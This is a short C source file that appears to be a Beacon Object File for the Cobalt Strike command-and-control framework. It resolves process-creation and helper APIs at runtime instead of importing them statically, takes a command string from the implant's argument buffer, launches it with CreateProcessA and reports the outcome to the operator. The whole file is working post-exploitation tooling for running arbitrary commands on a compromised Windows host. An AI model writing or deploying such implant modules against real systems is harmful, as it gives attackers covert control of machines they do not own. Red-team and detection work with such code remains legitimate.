#include <windows.h>
#include <stdio.h>
#include "beacon.h"

#define printf(format, args...) { BeaconPrintf(CALLBACK_OUTPUT, format, ## args); }

DECLSPEC_IMPORT FARPROC WINAPI kernel32$GetProcAddress(HANDLE, CHAR*);
DECLSPEC_IMPORT HANDLE WINAPI kernel32$LoadLibraryA(CHAR*);

FARPROC Resolver(CHAR *lib, CHAR *func) {
    FARPROC ptr = kernel32$GetProcAddress(kernel32$LoadLibraryA(lib), func);
    printf("%s$%s located at 0x%p\n", lib, func, ptr);
    return ptr;
}

VOID go(char *argv, int argc) {
	FARPROC CreateProcess = Resolver("kernel32.dll", "CreateProcessA");
	FARPROC memset = Resolver("msvcrt.dll", "memset");
	FARPROC GetLastError = Resolver("kernel32.dll", "GetLastError");
	FARPROC SetLastError = Resolver("kernel32.dll", "SetLastError");

	datap parser;
	CHAR *cmd = NULL;
	BeaconDataParse(&parser, argv, argc);
	cmd = BeaconDataExtract(&parser, NULL);
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	
	printf("Running the following command %s\n", cmd);
	
	memset(&si, 0x00, sizeof(STARTUPINFO));
	memset(&pi, 0x00, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFO);

	if(CreateProcess != NULL) {
		SetLastError(0);
		BOOL bResult = CreateProcess(cmd, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
		printf("Result is %d. Error: %d\n", bResult, GetLastError());
	}
}